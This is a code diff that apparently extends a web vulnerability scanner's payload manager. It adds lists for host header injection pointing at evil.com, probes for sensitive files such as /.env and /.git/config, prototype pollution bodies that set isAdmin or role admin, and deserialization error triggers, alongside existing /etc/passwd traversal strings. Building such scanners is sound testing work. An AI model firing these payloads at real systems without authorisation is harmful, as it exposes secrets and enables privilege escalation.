@@ -549,6 +549,79 @@ class PayloadManager:
                     "..%00/..%00/..%00/etc/passwd",
                 ],
             },
+
+            # ── Host Header Attacks ─────────────────────────────────
+            'host_header': {
+                'injection': [
+                    "evil-attacker.com",
+                    "evil.com:@legitimate.com",
+                    "legitimate.com.evil.com",
+                    "localhost",
+                    "127.0.0.1",
+                ],
+                'headers': [
+                    "X-Forwarded-Host: evil.com",
+                    "X-Host: evil.com",
+                    "X-Forwarded-Server: evil.com",
+                    "Forwarded: host=evil.com",
+                    "X-Original-URL: /admin",
+                ],
+            },
+
+            # ── Information Disclosure ──────────────────────────────
+            'info_disclosure': {
+                'sensitive_paths': [
+                    "/.git/HEAD", "/.git/config", "/.env", "/.env.backup",
+                    "/phpinfo.php", "/info.php", "/server-status", "/server-info",
+                    "/debug", "/trace", "/actuator", "/actuator/env",
+                    "/swagger.json", "/swagger-ui.html", "/api-docs",
+                    "/openapi.json", "/graphql",
+                    "/backup.sql", "/database.sql", "/dump.sql",
+                    "/error.log", "/debug.log",
+                    "/elmah.axd", "/wp-config.php.bak",
+                    "/.svn/entries", "/.hg/requires",
+                ],
+                'error_triggers': [
+                    "/'\"\\;{}()<>[]",
+                    "/%00%0a%0d",
+                    "/?__debug__=1",
+                    "/?debug=true",
+                ],
+            },
+
+            # ── Prototype Pollution ─────────────────────────────────
+            'prototype_pollution': {
+                'query_params': [
+                    "__proto__[polluted]=sudarshan_test",
+                    "__proto__.polluted=sudarshan_test",
+                    "constructor[prototype][polluted]=sudarshan_test",
+                    "constructor.prototype.polluted=sudarshan_test",
+                ],
+                'json_bodies': [
+                    '{"__proto__": {"polluted": "sudarshan_test"}}',
+                    '{"constructor": {"prototype": {"polluted": "sudarshan_test"}}}',
+                    '{"__proto__": {"isAdmin": true}}',
+                    '{"__proto__": {"status": 200}}',
+                    '{"__proto__": {"role": "admin"}}',
+                    '{"constructor": {"prototype": {"isAdmin": true}}}',
+                ],
+            },
+
+            # ── Insecure Deserialization ────────────────────────────
+            'insecure_deserialization': {
+                'detection_markers': [
+                    "rO0AB",  # Java serialized base64 prefix
+                    "O:4:",   # PHP serialized object
+                    "a:2:",   # PHP serialized array
+                    "gAOV",   # Python pickle base64
+                ],
+                'error_triggers': [
+                    'O:9:"Exception":1:{s:7:"message";s:4:"test";}',
+                    '{"@type":"java.lang.Runtime"}',
+                    'a:1:{s:4:"test";O:8:"stdClass":0:{}}',
+                    'O:7:"Unknown":0:{}',
+                ],
+            },
         }
 
     # ================================================================
